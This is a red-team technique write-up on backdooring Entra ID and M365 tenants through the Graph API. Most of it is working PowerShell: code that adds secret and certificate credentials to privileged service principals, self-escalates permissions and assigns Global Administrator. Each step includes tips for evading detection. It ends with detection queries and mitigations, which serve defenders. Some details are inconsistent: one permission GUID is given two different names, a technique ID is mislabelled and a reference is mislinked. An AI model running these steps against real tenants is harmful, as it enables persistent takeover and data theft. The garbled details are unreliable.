# [REALWORLD-032]: Graph API Backdoor Creation

## 1. METADATA HEADER

| Attribute | Details |
|---|---|
| **Technique ID** | REALWORLD-032 |
| **MITRE ATT&CK v18.1** | [T1098.004 - Account Manipulation: Additional Cloud Credentials](https://attack.mitre.org/techniques/T1098/004/) |
| **Tactic** | Persistence, Privilege Escalation |
| **Platforms** | Entra ID, M365 (Exchange Online, SharePoint Online, Teams) |
| **Severity** | **Critical** |
| **CVE** | N/A (legitimate API feature, exploitable for persistence) |
| **Technique Status** | **ACTIVE** |
| **Last Verified** | 2025-01-09 |
| **Affected Versions** | All Entra ID and M365 tenants; no version dependency |
| **Patched In** | No patches available; mitigated via RBAC and monitoring (see Mitigations) |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

---

## 2. EXECUTIVE SUMMARY

**Concept:** Graph API Backdoor Creation is a persistence technique where attackers establish headless (non-interactive) access to an Entra ID tenant by manipulating service principals (application registrations) and their credentials. Attackers add new client secrets or certificates to existing service principals—particularly those with high-privileged roles (Global Administrator, Cloud Administrator) or dangerous Graph permissions (RoleManagement.ReadWrite.Directory, AppRoleAssignment.ReadWrite.All). These credentials allow the attacker to authenticate as the service principal via OAuth 2.0 client credentials flow, granting persistent access that survives password changes, MFA resets, and even full account deletion (the service principal remains). The attacker can then escalate privileges, create additional backdoor accounts, or directly manipulate directory objects.

**Attack Surface:** Service principals with excessive permissions, unchecked credential assignments, Global Administrator roles assigned to applications, vulnerable Graph permissions (AppRoleAssignment.ReadWrite.All, RoleManagement.ReadWrite.Directory, Domain.ReadWrite.All).

**Business Impact:** **Persistent tenant-wide compromise.** Attackers maintain permanent access to the organization's cloud infrastructure, independent of user account status. They can create new admin accounts, reset existing admin credentials, access all M365 resources (email, files, meetings, chats), modify federation trust relationships, and deploy ransomware via Logic Apps or Azure Automation Runbooks.

**Technical Context:** Creating a backdoor takes 10-30 seconds (Add-MgServicePrincipalPassword API call). Detection likelihood is **LOW** if monitoring is not configured (service principal credential additions are not logged by default), **MEDIUM** if Entra ID audit logs are monitored, **MEDIUM-HIGH** if Graph activity logs are enabled.

### Operational Risk
- **Execution Risk:** **Low** – Requires legitimate service principal with permission grants already in place; no new files to execute
- **Stealth:** **High** – Service principal modifications appear as routine API calls; no process execution or registry modification
- **Reversibility:** **Easy** – Simply delete the credential; however, by that time attacker has established secondary persistence via user accounts or additional service principals

### Compliance Mappings

| Framework | Control / ID | Description |
|---|---|---|
| **CIS Benchmark** | CIS 1.8 | Prevent service principal credential management by non-admins |
| **DISA STIG** | AU-2(b) | Enhanced auditing of service principal modifications |
| **CISA SCuBA** | Entra-SEC-14 | Service Principal Security and Credential Management |
| **NIST 800-53** | IA-2, IA-4, AC-2(f) | Identification, authentication, and account management controls for service principals |
| **GDPR** | Art. 32 | Security of Processing – measures to protect API credentials |
| **DORA** | Art. 9 | Protection measures for API access control and credential management |
| **NIS2** | Art. 21(1)(e) | Detection and incident response for unauthorized credential creation |
| **ISO 27001** | A.9.2, A.9.4 | Access control and cryptographic key management for service principals |
| **ISO 27005** | Service Principal Compromise Risk | Risk scenario: Service principal backdoors leading to tenant-wide compromise |

---

## 3. TECHNICAL PREREQUISITES

**Required Privileges:**
- **Application Administrator** or **Cloud Application Administrator** role (can manage app credentials)
- **Service principal ownership** (owner can add credentials to their own apps)
- **RoleManagement.ReadWrite.Directory** Graph permission (can escalate service principal to Global Admin)
- **AppRoleAssignment.ReadWrite.All** Graph permission (can grant additional permissions)

**Required Access:**
- Compromised user account with one of the above roles, OR
- Compromised service principal that already has the permissions, OR
- Code execution on Azure VM or Logic App with managed identity

**Supported Versions:**
- **Entra ID:** All versions and tenants
- **M365:** All tenants with service principals
- **Azure:** All subscriptions with Entra ID integration

**Tools:**
- [Microsoft Graph PowerShell SDK](https://learn.microsoft.com/en-us/powershell/microsoftgraph/installation) (primary tool for service principal manipulation)
- [Azure CLI](https://learn.microsoft.com/en-us/cli/azure/) (alternative, less detailed Graph access)
- [Graph Explorer](https://developer.microsoft.com/en-us/graph/graph-explorer) (interactive testing)
- [BARK (BloodHound Azure Edition)](https://github.com/BloodHoundAD/BARK) (enumeration and exploitation)
- [Stratus Red Team](https://stratus-red-team.cloud/) (automated technique simulation)

---

## 4. ENVIRONMENTAL RECONNAISSANCE

### PowerShell Reconnaissance (Graph SDK)

**Objective:** Identify service principals with excessive permissions and vulnerable role assignments.

```powershell
# Connect to Microsoft Graph
Connect-MgGraph -Scopes "Application.ReadWrite.All", "Directory.ReadWrite.All", "RoleManagement.Read.Directory"

# Enumerate all service principals
Get-MgServicePrincipal -PageSize 999 | Select-Object DisplayName, Id, AppId, AccountEnabled | Head -20

# Find service principals with Global Administrator role
Get-MgServicePrincipal -PageSize 999 | ForEach-Object {
    $roles = Get-MgServicePrincipalAppRoleAssignedTo -ServicePrincipalId $_.Id
    if ($roles.PrincipalDisplayName -contains "Global Administrator" -or $roles.AppRoleId -contains "62e90394-69f5-4237-9190-012177145e10") {
        Write-Host "[!] Service Principal with Global Admin: $($_.DisplayName)"
    }
}

# Find service principals with dangerous Graph permissions
$dangerousPermissions = @(
    "AppRoleAssignment.ReadWrite.All",
    "RoleManagement.ReadWrite.Directory",
    "Domain.ReadWrite.All",
    "User.ReadWrite.All",
    "Group.Create"
)

Get-MgServicePrincipal -PageSize 999 | ForEach-Object {
    $sp = $_
    $permissions = Get-MgServicePrincipalAppRoleAssignment -ServicePrincipalId $sp.Id | Select-Object -ExpandProperty AppRoleId
    if ($permissions -in $dangerousPermissions) {
        Write-Host "[!] Dangerous permission found on $($sp.DisplayName): $permissions"
    }
}

# List existing credentials for a target service principal
$targetSP = Get-MgServicePrincipal -Filter "displayName eq 'Corporate Finance Analytics'"
Get-MgServicePrincipalPasswordCredential -ServicePrincipalId $targetSP.Id | Select-Object DisplayName, Hint, EndDateTime
```

**What to Look For:**
- Service principals with Global Administrator or Privileged Administrator roles
- Service principals with AppRoleAssignment.ReadWrite.All or RoleManagement.ReadWrite.Directory permissions
- Service principals with multiple password credentials (suspicious if multiple old credentials exist)
- Service principals not owned by IT (potential shadow IT or compromised apps)
- Recently added service principal credentials (within last 24 hours, unusual)

**Version Note:** Microsoft Graph PowerShell SDK is consistent across all Windows/PowerShell versions.

---

## 5. DETAILED EXECUTION METHODS AND THEIR STEPS

### METHOD 1: Add Password Credential to Existing Service Principal (No Elevation Needed)

**Supported Versions:** All Entra ID tenants; requires Application Administrator role or service principal ownership

#### Step 1: Identify Target Service Principal
**Objective:** Find a service principal that is already assigned high-privilege roles or dangerous permissions.

**Command (All Versions):**
```powershell
Connect-MgGraph -Scopes "Application.ReadWrite.All", "Directory.ReadWrite.All"

# Method 1: Find service principals by role assignment
$globalAdminRole = Get-MgDirectoryRole -Filter "displayName eq 'Global Administrator'"
$adminMembers = Get-MgDirectoryRoleMember -DirectoryRoleId $globalAdminRole.Id

# Filter for service principals
$adminMembers | Where-Object { $_.Id -match "^[0-9a-f]{8}-[0-9a-f]{4}" } | ForEach-Object {
    $sp = Get-MgServicePrincipal -ServicePrincipalId $_.Id
    Write-Host "[!] Found service principal with Global Admin: $($sp.DisplayName)"
}

# Method 2: Find service principals with specific permissions
$graphSP = Get-MgServicePrincipal -Filter "displayName eq 'Microsoft Graph'"
$appRoleAssignments = Get-MgServicePrincipalAppRoleAssignmentByAppRoleId -ServicePrincipalId $graphSP.Id `
    -AppRoleId "9e3f62cf-ca93-4989-b6ce-bf83c28f9fe8"  # RoleManagement.ReadWrite.Directory

# List service principals with dangerous permissions
$targetSP = Get-MgServicePrincipal -Filter "displayName eq 'Finance Analytics Dashboard'"
Write-Host "[+] Target Service Principal: $($targetSP.DisplayName)"
Write-Host "[+] Service Principal ID: $($targetSP.Id)"
```

**Expected Output:**
```
[+] Target Service Principal: Finance Analytics Dashboard
[+] Service Principal ID: 12345678-1234-1234-1234-123456789012
```

**What This Means:**
- The Finance Analytics Dashboard service principal is already assigned high-privilege roles or permissions
- Adding a credential to this service principal allows attacker to authenticate with the same privileges
- No additional permission grants are needed

**OpSec & Evasion:**
- Choose service principals that are used for legitimate automation (less suspicious)
- Detection likelihood: **MEDIUM** (service principal modifications are logged in Entra ID audit logs if enabled)

**Troubleshooting:**
- **Error:** "Insufficient privileges to complete the operation"
  - **Cause:** User doesn't have Application Administrator role
  - **Fix:** Request elevated permissions or compromise an Application Administrator account first

**References & Proofs:**
- [Microsoft Graph Service Principal API](https://learn.microsoft.com/en-us/graph/api/serviceprincipal-post-passwordcredentials)

#### Step 2: Add Password Credential (Backdoor)
**Objective:** Create a new password credential that allows attacker to authenticate as the service principal.

**Command (All Versions):**
```powershell
# Get target service principal
$targetSP = Get-MgServicePrincipal -Filter "displayName eq 'Finance Analytics Dashboard'"

# Create a new password credential (backdoor secret)
$passwordCredential = @{
    DisplayName = "BackdoorSecret_$(Get-Date -Format 'yyyyMMdd_HHmmss')"
    EndDateTime = (Get-Date).AddYears(2)  # 2-year validity; long persistence
}

$newSecret = Add-MgServicePrincipalPassword -ServicePrincipalId $targetSP.Id -PasswordCredential $passwordCredential

Write-Host "[+] Backdoor credential created!"
Write-Host "[+] Service Principal: $($targetSP.DisplayName)"
Write-Host "[+] Client ID: $($targetSP.AppId)"
Write-Host "[+] Client Secret: $($newSecret.SecretText)"
Write-Host "[+] Expires: $($newSecret.EndDateTime)"

# Save credentials for attacker use
$backendoorCreds = @{
    ClientId = $targetSP.AppId
    ClientSecret = $newSecret.SecretText
    TenantId = (Get-MgContext).TenantId
}

# Output for attacker
$backendoorCreds | ConvertTo-Json | Out-File -Path "C:\temp\backdoor.json" -Force
```

**Expected Output:**
```
[+] Backdoor credential created!
[+] Service Principal: Finance Analytics Dashboard
[+] Client ID: 12345678-90ab-cdef-ghij-klmnopqrstuv
[+] Client Secret: aBcDeF.g~hIjKlMnOpQrStUvWxYz.AbCdEfGhIjKl
[+] Expires: 1/9/2027 10:35:00 AM
```

**What This Means:**
- The backdoor secret is now created and stored
- Attacker can use this secret to authenticate as the service principal
- The service principal's existing role assignments grant the attacker its privileges
- Persists indefinitely (2-year expiration)

**OpSec & Evasion:**
- Use a realistic display name (e.g., "AutomationSecret_Quarterly", "BackupCredential", "ServiceAccount_2025")
- Set expiration to 1-2 years (too short looks suspicious, too long violates compliance)
- Detection likelihood: **MEDIUM** (Entra ID audit logs will show "Add service principal credentials" event if auditing enabled)

**Troubleshooting:**
- **Error:** "User does not have permission to add credentials"
  - **Cause:** Target service principal is owned by another user (not current user)
  - **Fix:** Compromise an Application Administrator, or compromise the service principal owner

**References & Proofs:**
- [Add Service Principal Password Credential - Microsoft Graph](https://learn.microsoft.com/en-us/graph/api/serviceprincipal-addpassword)

#### Step 3: Authenticate Using Backdoor Credentials
**Objective:** Test the backdoor by authenticating as the service principal.

**Command (PowerShell - All Versions):**
```powershell
# Use the backdoor credentials to authenticate
$clientId = "12345678-90ab-cdef-ghij-klmnopqrstuv"
$clientSecret = "aBcDeF.g~hIjKlMnOpQrStUvWxYz.AbCdEfGhIjKl"
$tenantId = (Get-MgContext).TenantId

# Disconnect from current context
Disconnect-MgGraph

# Authenticate as the service principal using backdoor credentials
$secureSecret = ConvertTo-SecureString -String $clientSecret -AsPlainText -Force
$credential = New-Object System.Management.Automation.PSCredential($clientId, $secureSecret)

Connect-MgGraph -TenantId $tenantId -ClientSecretCredential $credential -NoWelcome

# Verify successful authentication
$context = Get-MgContext
Write-Host "[+] Authenticated as: $($context.AppDisplayName)"
Write-Host "[+] Tenant: $($context.TenantId)"
```

**Expected Output (Successful Authentication):**
```
[+] Authenticated as: Finance Analytics Dashboard
[+] Tenant: 87654321-4321-4321-4321-210987654321

# Confirm attacker now has service principal's permissions
Get-MgUser | Measure-Object
# If no error, attacker has User.Read.All or better; attempt admin operations
```

**What This Means:**
- The backdoor credentials successfully authenticate the attacker as the service principal
- The attacker now has all permissions assigned to the service principal
- If the service principal has Global Administrator role, the attacker is now a tenant admin

**OpSec & Evasion:**
- Test authentication from attacker's own device or cloud VM (not from victim network)
- Detection likelihood: **MEDIUM** (unusual service principal sign-in from attacker IP will trigger anomaly detection)

**Troubleshooting:**
- **Error:** "Invalid client secret" or "AADSTS700016"
  - **Cause:** Secret is incorrect or has special characters that require encoding
  - **Fix:** Copy secret directly from Azure Portal without modification; ensure no spaces/newlines

**References & Proofs:**
- [OAuth 2.0 Client Credentials Flow - Microsoft](https://learn.microsoft.com/en-us/entra/identity-platform/v2-oauth2-client-creds-grant-flow)

---

### METHOD 2: Escalate Service Principal Permissions Using Graph API (Privilege Escalation)

**Supported Versions:** All Entra ID tenants

#### Step 1: Identify AppRoleAssignment.ReadWrite.All Permission
**Objective:** Confirm the service principal has AppRoleAssignment.ReadWrite.All permission (allows self-escalation).

**Command (All Versions):**
```powershell
# Authenticate as the backdoored service principal
$clientId = "12345678-90ab-cdef-ghij-klmnopqrstuv"
$clientSecret = "aBcDeF.g~hIjKlMnOpQrStUvWxYz.AbCdEfGhIjKl"
$tenantId = (Get-MgContext).TenantId

$secureSecret = ConvertTo-SecureString -String $clientSecret -AsPlainText -Force
$credential = New-Object System.Management.Automation.PSCredential($clientId, $secureSecret)
Connect-MgGraph -TenantId $tenantId -ClientSecretCredential $credential

# Check current service principal's roles/permissions
$currentSP = Get-MgServicePrincipal -ServicePrincipalId (Get-MgContext).ServicePrincipalId
$currentRoles = Get-MgServicePrincipalAppRoleAssignment -ServicePrincipalId $currentSP.Id

Write-Host "[*] Current service principal: $($currentSP.DisplayName)"
Write-Host "[*] Current permissions:"
$currentRoles | ForEach-Object {
    Write-Host "  - $($_.AppRoleId)"
}

# Check if AppRoleAssignment.ReadWrite.All is present
if ($currentRoles.AppRoleId -contains "9e3f62cf-ca93-4989-b6ce-bf83c28f9fe8") {
    Write-Host "[+] AppRoleAssignment.ReadWrite.All is present! Self-escalation possible."
} else {
    Write-Host "[-] AppRoleAssignment.ReadWrite.All not present. Cannot escalate."
}
```

**Expected Output:**
```
[*] Current service principal: Finance Analytics Dashboard
[*] Current permissions:
  - 9e3f62cf-ca93-4989-b6ce-bf83c28f9fe8 (AppRoleAssignment.ReadWrite.All)
  - a82116e5-55eb-4c41-a853-6e0b688bc86f (Directory.Read.All)
[+] AppRoleAssignment.ReadWrite.All is present! Self-escalation possible.
```

**What This Means:**
- The service principal already has AppRoleAssignment.ReadWrite.All
- This permission allows assigning other permissions to service principals (including itself)
- Attacker can now escalate to even more dangerous permissions

**OpSec & Evasion:**
- Detection likelihood: **LOW** (permission enumeration is normal Graph API usage)

**Troubleshooting:**
- **Error:** "Not enough permissions to enumerate roles"
  - **Cause:** Graph API requires Directory.Read.All to enumerate roles
  - **Fix:** Request elevation or use Azure CLI (`az ad sp list --output table`)

**References & Proofs:**
- [AppRole Permissions Reference](https://learn.microsoft.com/en-us/graph/permissions-reference#application-permissions)

#### Step 2: Grant RoleManagement.ReadWrite.Directory Permission
**Objective:** Self-assign RoleManagement.ReadWrite.Directory to enable administrative control.

**Command (All Versions):**
```powershell
# Authenticate as backdoored service principal
$clientId = "12345678-90ab-cdef-ghij-klmnopqrstuv"
$clientSecret = "aBcDeF.g~hIjKlMnOpQrStUvWxYz.AbCdEfGhIjKl"
$secureSecret = ConvertTo-SecureString -String $clientSecret -AsPlainText -Force
$credential = New-Object System.Management.Automation.PSCredential($clientId, $secureSecret)
Connect-MgGraph -TenantId $tenantId -ClientSecretCredential $credential

# Get current service principal
$currentSP = Get-MgServicePrincipal -ServicePrincipalId (Get-MgContext).ServicePrincipalId

# Get Microsoft Graph service principal (where RoleManagement.ReadWrite.Directory permission lives)
$graphSP = Get-MgServicePrincipal -Filter "appId eq '00000003-0000-0000-c000-000000000000'"

# Find RoleManagement.ReadWrite.Directory app role ID
$roleManagementRole = $graphSP.AppRoles | Where-Object { $_.Value -eq "RoleManagement.ReadWrite.Directory" }
$roleId = $roleManagementRole.Id

Write-Host "[*] Role ID for RoleManagement.ReadWrite.Directory: $roleId"

# Grant the role to the current service principal (self-escalation)
New-MgServicePrincipalAppRoleAssignment -ServicePrincipalId $currentSP.Id `
    -AppRoleId $roleId `
    -PrincipalId $currentSP.Id `
    -ResourceId $graphSP.Id

Write-Host "[+] Successfully escalated to RoleManagement.ReadWrite.Directory!"
Write-Host "[+] Service Principal can now assign Global Administrator role to itself or other accounts"
```

**Expected Output:**
```
[+] Successfully escalated to RoleManagement.ReadWrite.Directory!
[+] Service Principal can now assign Global Administrator role to itself or other accounts
```

**What This Means:**
- The service principal now has RoleManagement.ReadWrite.Directory permission
- This allows assigning ANY directory role (including Global Administrator) to ANY principal
- Attacker is now one API call away from becoming a tenant admin

**OpSec & Evasion:**
- Permission assignment triggers Entra ID audit log event: "Add app role assignment"
- Detection likelihood: **MEDIUM-HIGH** (unusual service principal self-escalation is highly suspicious)

**Troubleshooting:**
- **Error:** "Insufficient privileges to perform the operation"
  - **Cause:** AppRoleAssignment.ReadWrite.All permission not present
  - **Fix:** This method only works if service principal already has AppRoleAssignment.ReadWrite.All

**References & Proofs:**
- [Semperis - Exploiting App-Only Graph Permissions](https://www.semperis.com/blog/exploiting-app-only-graph-permissions-in-entra-id/)

#### Step 3: Assign Global Administrator Role
**Objective:** Grant Global Administrator role to the service principal (complete tenant compromise).

**Command (All Versions):**
```powershell
# Get Global Administrator role ID
$globalAdminRole = Get-MgDirectoryRole -Filter "displayName eq 'Global Administrator'"
if (-not $globalAdminRole) {
    # If not already activated, activate it
    New-MgDirectoryRole -RoleTemplateId "62e90394-69f5-4237-9190-012177145e10"
    $globalAdminRole = Get-MgDirectoryRole -Filter "displayName eq 'Global Administrator'"
}

# Add service principal to Global Administrator role
$currentSP = Get-MgServicePrincipal -ServicePrincipalId (Get-MgContext).ServicePrincipalId

New-MgDirectoryRoleMember -DirectoryRoleId $globalAdminRole.Id -DirectoryObjectId $currentSP.Id

Write-Host "[+] Service Principal assigned to Global Administrator role!"
Write-Host "[+] Service Principal ID: $($currentSP.Id)"
Write-Host "[+] Service Principal: $($currentSP.DisplayName)"

# Verify escalation
$adminRole = Get-MgDirectoryRole -Filter "displayName eq 'Global Administrator'"
$adminMembers = Get-MgDirectoryRoleMember -DirectoryRoleId $adminRole.Id
$adminMembers | Where-Object { $_.Id -eq $currentSP.Id } | ForEach-Object {
    Write-Host "[+] Confirmed: Service Principal is now Global Administrator"
}
```

**Expected Output:**
```
[+] Service Principal assigned to Global Administrator role!
[+] Service Principal ID: 12345678-1234-1234-1234-123456789012
[+] Service Principal: Finance Analytics Dashboard
[+] Confirmed: Service Principal is now Global Administrator
```

**What This Means:**
- The service principal now has Global Administrator role
- The attacker can now perform ANY administrative action on the tenant
- The attacker has complete persistent access to the organization's cloud infrastructure

**OpSec & Evasion:**
- Role assignment is highly visible in audit logs: "Add member to role"
- Detection likelihood: **CRITICAL** (service principal becoming Global Admin is a critical alert in most security stacks)

**Troubleshooting:**
- **Error:** "Role template not found"
  - **Cause:** Global Administrator role template doesn't exist (rare)
  - **Fix:** Use role definition ID directly: "62e90394-69f5-4237-9190-012177145e10"

**References & Proofs:**
- [Role Management via Graph API](https://learn.microsoft.com/en-us/graph/api/directoryrole-post-members)

---

### METHOD 3: Add Certificate Credential to Service Principal (Longer Persistence)

**Supported Versions:** All Entra ID tenants

#### Step 1: Generate Self-Signed Certificate
**Objective:** Create a certificate-based credential that persists longer than password secrets.

**Command (PowerShell - All Versions):**
```powershell
# Generate a self-signed certificate (valid for 10 years)
$cert = New-SelfSignedCertificate `
    -CertStoreLocation "cert:\CurrentUser\My" `
    -Subject "CN=ServicePrincipalBackdoor" `
    -KeySpec RSA `
    -KeyLength 2048 `
    -NotAfter (Get-Date).AddYears(10)

# Export certificate (public key only)
$certPath = "C:\temp\backdoor_cert.cer"
Export-Certificate -Cert $cert -FilePath $certPath -Force | Out-Null

# Export private key for attacker (PFX format)
$pfxPath = "C:\temp\backdoor_cert.pfx"
$pfxPassword = ConvertTo-SecureString "P@ssw0rd123" -AsPlainText -Force
Export-PfxCertificate -Cert $cert -FilePath $pfxPath -Password $pfxPassword -Force | Out-Null

Write-Host "[+] Certificate created"
Write-Host "[+] Certificate thumbprint: $($cert.Thumbprint)"
Write-Host "[+] Public key: $certPath"
Write-Host "[+] Private key (for attacker): $pfxPath"
```

**Expected Output:**
```
[+] Certificate created
[+] Certificate thumbprint: 1234567890ABCDEF1234567890ABCDEF12345678
[+] Public key: C:\temp\backdoor_cert.cer
[+] Private key (for attacker): C:\temp\backdoor_cert.pfx
```

**What This Means:**
- A 10-year certificate is created that can authenticate to Entra ID
- The private key can be used on any device to authenticate as the service principal
- Much longer-lived than password secrets (which expire in 2 years)

**OpSec & Evasion:**
- Self-signed certificates are legitimate for service principals
- Detection likelihood: **LOW** (certificate credentials are commonly used for automation)

**Troubleshooting:**
- **Error:** "Certificate not found in store"
  - **Cause:** -CertStoreLocation path is incorrect
  - **Fix:** Use "cert:\CurrentUser\My" for user cert store, "cert:\LocalMachine\My" for system store

**References & Proofs:**
- [New-SelfSignedCertificate Documentation](https://learn.microsoft.com/en-us/powershell/module/pki/new-selfsignedcertificate)

#### Step 2: Add Certificate to Service Principal
**Objective:** Upload the certificate as a credential for the service principal.

**Command (All Versions):**
```powershell
# Connect as original user (with Application Administrator role)
Connect-MgGraph -Scopes "Application.ReadWrite.All"

# Get target service principal
$targetSP = Get-MgServicePrincipal -Filter "displayName eq 'Finance Analytics Dashboard'"

# Read certificate public key
$certPath = "C:\temp\backdoor_cert.cer"
$cert = New-Object System.Security.Cryptography.X509Certificates.X509Certificate2($certPath)
$certValue = [System.Convert]::ToBase64String($cert.RawData)

# Create key credential object
$keyCredential = @{
    Type = "AsymmetricX509Cert"
    Usage = "Sign"
    Key = $certValue
    DisplayName = "ServiceBackdoorCert_$(Get-Date -Format 'yyyyMMdd')"
    EndDateTime = $cert.NotAfter
}

# Add certificate to service principal
$result = New-MgServicePrincipalKeyCredential -ServicePrincipalId $targetSP.Id -KeyCredentials @($keyCredential)

Write-Host "[+] Certificate credential added to service principal"
Write-Host "[+] Certificate thumbprint: $($cert.Thumbprint)"
Write-Host "[+] Valid until: $($cert.NotAfter)"
```

**Expected Output:**
```
[+] Certificate credential added to service principal
[+] Certificate thumbprint: 1234567890ABCDEF1234567890ABCDEF12345678
[+] Valid until: 1/9/2035 5:00:00 PM
```

**What This Means:**
- The certificate is now registered as a credential for the service principal
- The attacker can use the private key (PFX file) to authenticate until 2035
- Much longer persistence than password-based backdoors

**OpSec & Evasion:**
- Certificate-based credentials appear legitimate for business automation
- Detection likelihood: **LOW** (unless specifically looking for unusual certificate creation times)

**Troubleshooting:**
- **Error:** "Invalid certificate format"
  - **Cause:** Certificate encoding or format issue
  - **Fix:** Ensure certificate is valid X.509 format; use `certutil -dump` to verify

**References & Proofs:**
- [Add Key Credential to Service Principal](https://learn.microsoft.com/en-us/graph/api/serviceprincipal-addkeycredential)

#### Step 3: Authenticate Using Certificate
**Objective:** Verify the certificate-based backdoor works.

**Command (PowerShell - All Versions):**
```powershell
# Load the PFX certificate
$pfxPath = "C:\temp\backdoor_cert.pfx"
$pfxPassword = ConvertTo-SecureString "P@ssw0rd123" -AsPlainText -Force
$cert = New-Object System.Security.Cryptography.X509Certificates.X509Certificate2($pfxPath, $pfxPassword)

# Authenticate using certificate
$clientId = "12345678-90ab-cdef-ghij-klmnopqrstuv"
$tenantId = (Get-MgContext).TenantId

Connect-MgGraph -ClientId $clientId -TenantId $tenantId -Certificate $cert

# Verify successful authentication
$context = Get-MgContext
Write-Host "[+] Authenticated using certificate!"
Write-Host "[+] Service Principal: $($context.AppDisplayName)"
Write-Host "[+] Certificate expiration: $($cert.NotAfter)"
```

**Expected Output:**
```
[+] Authenticated using certificate!
[+] Service Principal: Finance Analytics Dashboard
[+] Certificate expiration: 1/9/2035 5:00:00 PM
```

**What This Means:**
- The certificate-based backdoor is verified and functional
- The attacker can now authenticate anytime until 2035 using just the PFX file and password
- Even if password credentials are revoked, the certificate backdoor persists

**OpSec & Evasion:**
- Storing PFX file on attacker's infrastructure ensures persistence
- Detection likelihood: **MEDIUM** (unusual certificate-based service principal authentication from attacker IP)

**Troubleshooting:**
- **Error:** "Could not load certificate"
  - **Cause:** PFX file path or password incorrect
  - **Fix:** Verify PFX path and password match

**References & Proofs:**
- [Certificate-Based Authentication for Service Principals](https://learn.microsoft.com/en-us/entra/identity-platform/certificate-based-authentication-for-service-principals)

---

## 6. ATOMIC RED TEAM

**Atomic Red Team Test:** T1098.001

**Test Name:** Create a Service Principal Backdoor

**Commands:**
```powershell
# Invoke Atomic test
Invoke-AtomicTest T1098.004 -TestNumbers 1

# Manual equivalent (add password credential)
$sp = Get-MgServicePrincipal -Filter "displayName eq 'Test App'"
$cred = Add-MgServicePrincipalPassword -ServicePrincipalId $sp.Id `
    -PasswordCredential @{ DisplayName = "BackdoorSecret"; EndDateTime = (Get-Date).AddYears(2) }

# Cleanup
Remove-MgServicePrincipalPassword -ServicePrincipalId $sp.Id -KeyId $cred.KeyId
```

**Reference:** [Atomic Red Team T1098.004](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1098.004/T1098.004.md)

---

## 7. MICROSOFT SENTINEL DETECTION

**Rule 1: Service Principal Credential Addition (Backdoor Detection)**

**KQL Query:**
```kusto
AuditLogs
| where OperationName == "Add service principal credentials"
| where Result == "success"
| project TimeGenerated, InitiatedByUser=InitiatedBy.user.userPrincipalName, TargetSP=TargetResources[0].displayName, 
    TargetSPId=TargetResources[0].id, CredentialType=AdditionalDetails[0].key, 
    CredentialDisplayName=AdditionalDetails[0].value, AADTenantId
| where TargetSP notcontains "System"  // Exclude known system service principals
| summarize count() by TargetSP, InitiatedByUser, TimeGenerated
| where count_ >= 1
```

**Manual Configuration (Azure Portal):**

1. Navigate to **Microsoft Sentinel** → **Analytics** → **+ Create** → **Scheduled query rule**
2. **General Tab:**
   - Name: `Service Principal Backdoor Credential Addition`
   - Severity: `Critical`
3. **Set rule logic Tab:**
   - Paste KQL query above
   - Run every: `5 minutes`
   - Lookup data from the last: `1 day`
4. **Incident settings Tab:**
   - Enable **Create incidents**
   - Group by TargetSP, InitiatedByUser
5. Click **Review + create**

---

## 8. DEFENSIVE MITIGATIONS

### Priority 1: CRITICAL

**1. Restrict Service Principal Credential Management via RBAC**

**Applies To Versions:** All Entra ID tenants

**Manual Configuration (Azure Portal):**

1. Navigate to **Azure Portal** → **Entra ID** → **Roles and administrators**
2. Search for **Application Administrator** role
3. Click the role → **Assignments** tab
4. Review who has this role; remove unnecessary assignments
5. Create custom role:
   - Go to **Roles and administrators** → **Custom roles** → **+ Create custom role**
   - Name: `Limited App Administrator`
   - Permissions: Uncheck `Update service principal credentials`
   - Assign to trusted users only

**2. Enable Entra ID Audit Logging for Service Principal Changes**

**Manual Configuration (Azure Portal):**

1. Navigate to **Azure Portal** → **Entra ID** → **Monitoring** → **Audit logs**
2. Verify **Audit log retention** is set to at least 30 days
3. Go to **Entra ID** → **Audit settings**
4. Ensure **Audit logs** toggle is **ON**
5. Create custom alert:
   - Navigate to **Azure Monitor** → **Alerts**
   - Create new alert rule for "Add service principal credentials" events

**Validation Command (PowerShell):**
```powershell
# Check if audit logging is enabled
Get-MgOrganization | Select-Object *, DirectorySize

# Query recent service principal credential additions
Get-MgAuditLogDirectoryAudit -Filter "operationName eq 'Add service principal credentials'" -Top 10 | 
    Select-Object TimeGenerated, InitiatedBy, TargetResources
```

**3. Implement Conditional Access to Block Service Principal Sign-In from Unusual Locations**

**Manual Configuration (Azure Portal):**

1. Navigate to **Azure Portal** → **Entra ID** → **Security** → **Conditional Access**
2. **+ New policy:**
   - Name: `Block Service Principal Sign-In from Unknown Locations`
   - Assignments:
     - Users: Service Principals (via dynamic group)
     - Cloud apps: All cloud apps
   - Conditions:
     - Location: Exclude company IP ranges
   - Access controls: **Block**
3. Enable policy: **On**

---

## 9. RELATED ATTACK CHAIN

| Step | Phase | Technique | Description |
|---|---|---|---|
| **1** | **Initial Access** | [IA-PHISH-001] Device Code Phishing | Attacker tricks user into approving device code |
| **2** | **Privilege Escalation** | **[REALWORLD-032]** Graph API Backdoor | Attacker creates service principal backdoor with high permissions |
| **3** | **Persistence** | [T1078] Valid Accounts | Attacker maintains access via service principal |
| **4** | **Lateral Movement** | [T1550] Use Alternate Authentication | Attacker impersonates other users via service principal |
| **5** | **Impact** | [T1537] Data Transfer | Attacker exfiltrates organization data |

---

## 10. REAL-WORLD EXAMPLES

### Example 1: FOCI-Enabled Apps Token Compromise (2024)
- **Target:** Organizations with FOCI (Family of Client IDs) apps configured
- **Timeline:** Ongoing 2024
- **Technique Status:** ACTIVE – Attackers create service principal backdoors via FOCI app APIs
- **Impact:** Persistent access via service principal; token theft enables lateral movement
- **Reference:** [JUMPSEC - TokenSmith Analysis](https://www.semperis.com/blog/exploiting-app-only-graph-permissions-in-entra-id/)

### Example 2: I SPy Escalation (2025)
- **Target:** Organizations with application administrators
- **Timeline:** July 2025 disclosure
- **Technique Status:** ACTIVE – Service principal takeover via Office 365 Exchange Online service principal manipulation
- **Impact:** Full tenant compromise via Global Administrator impersonation
- **Reference:** [DataDog Labs - I SPy Escalating to Entra ID Global Admin](https://securitylabs.datadoghq.com/articles/i-spy-escalating-to-entra-id-global-admin/)

---
